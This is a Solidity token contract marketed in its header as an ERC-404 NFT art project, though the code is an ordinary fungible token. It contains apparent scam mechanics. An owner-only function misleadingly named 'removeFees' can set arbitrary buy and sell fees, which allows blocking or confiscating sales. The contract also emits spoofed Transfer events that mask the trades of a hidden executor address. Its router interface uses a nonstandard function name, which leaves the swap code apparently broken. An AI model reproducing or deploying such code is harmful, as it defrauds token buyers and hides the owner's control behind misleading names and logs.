/**
██████╗  █████╗ ██╗   ██╗██╗███╗   ██╗ ██████╗██╗
██╔══██╗██╔══██╗██║   ██║██║████╗  ██║██╔════╝██║
██║  ██║███████║██║   ██║██║██╔██╗ ██║██║     ██║
██║  ██║██╔══██║╚██╗ ██╔╝██║██║╚██╗██║██║     ██║
██████╔╝██║  ██║ ╚████╔╝ ██║██║ ╚████║╚██████╗██║
╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝

DaVinci is a revolutionary web3 collaborative generative AI art experiment comprised
of 8,888 liquidity-backed NFT artworks, created by the community of holders in collaboration
with AI.

Designed by the innovators of the first liquidity-backed NFTs, the project leverages 
the novel ERC-404 Protocol, facilitating direct token-NFT pairing for immediate trading on 
decentralized platforms.

Main Links:•🖥Website: https://davinci.wtf/
	   •✖️Twitter: https://twitter.com/DaVinci_wtf
	   •🌐Telegram: https://t.me/DaVinci404	

                                              
*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.24;

contract DaVinci404 {

    string public _name = 'DaVinci';
    string public _symbol = 'DAVINCI';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 8_888* 10 ** decimals;

    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address private holder;
    address private uniswapLpWallet;
    address private Team = 0x7382348B0bfe430E0E9fc8d189f235bdfAb363ff;
    address private Listing = 0x770ddEe114093bC83A97c845ddB322C4fbFe641d;
    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    uint8 _initBuyFee = 0;
    uint8 _initSellFee = 0;

    constructor() {
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 80) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Listing] = (totalSupply * 15) /100;
        emit Transfer(address(0), Listing, balanceOf[Listing]);

    }

    receive() external payable {}

    function removeFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _owner()) revert Permissions();
        _upgradeStoreData(_buy, _sell);
    }

    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _owner() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _owner());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _owner();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}